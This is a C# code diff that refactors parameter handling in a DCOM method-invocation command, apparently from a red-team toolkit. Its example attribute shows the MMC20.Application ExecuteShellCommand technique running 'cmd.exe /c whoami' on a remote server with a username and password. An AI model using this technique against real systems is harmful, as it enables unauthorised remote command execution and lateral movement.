@@ -19,21 +19,14 @@ If the method is specified as a dot-separated multi-part name, this is interpret
 [Example("Invoke MMC20 ExecuteShellCommand with FQDN", "{0} LUMON-FS1.lumon.ind -UserName milchick@LUMON -Password Br3@kr00m! -Kdc LUMON-DC1 49B2791A-B1AE-4C90-9B8E-E860BA07F889 Document.ActiveView.ExecuteShellCommand \"cmd.exe\" C:\\ \" /c whoami\" \"\"", "The CLSID corresponds to MMC20.Application.  This object is activated, then the properties Document and retrieved ActiveView, and finally ExecuteShellCommand is executed on the ActiveView object.", Tag = "milchickKerb_Mmc20Exec_fqdn")]
 public class InvokeCommand : Command, IHaveServerName
 {
-
 	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
-	public AuthenticationParameters Authentication { get; set; }
+	public RpcParameterGroup? RpcParameters { get; set; }
 
-	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
-	public NetworkParameters NetworkParameters { get; set; }
-
-	[Parameter]
-	[Description("Encrypts RPC messages")]
-	public SwitchParam EncryptRpc { get; set; }
-
+	private string _serverName;
 	[Parameter(0)]
 	[Mandatory]
 	[Description("Name of the server to connect to")]
-	public string ServerName { get; set; }
+	public string ServerName { get => _serverName; set => _serverName = value; }
 
 
 	[Parameter(After = nameof(ServerName))]
@@ -59,14 +52,13 @@ public class InvokeCommand : Command, IHaveServerName
 	protected override void ValidateParameters(ParameterValidationContext context)
 	{
 		base.ValidateParameters(context);
-		this.Authentication.Validate(true, context, false);
+		this.RpcParameters.ValidateParameters(context, null, ref this._serverName);
 	}
 
 	protected override async Task<int> RunAsync(CancellationToken cancellationToken)
 	{
-
 		var rpcClient = this.CreateRpcClient();
-		rpcClient.DefaultAuthLevel = EncryptRpc.IsSet ? RpcAuthLevel.PacketPrivacy : RpcAuthLevel.PacketIntegrity;
+		this.RpcParameters?.ApplyTo(rpcClient, RpcAuthLevel.PacketIntegrity);
 
 		DcomClient dcom = await DcomClient.ConnectTo(this.ServerName, rpcClient, cancellationToken, callback: new DcomLogger(this.Log));
 
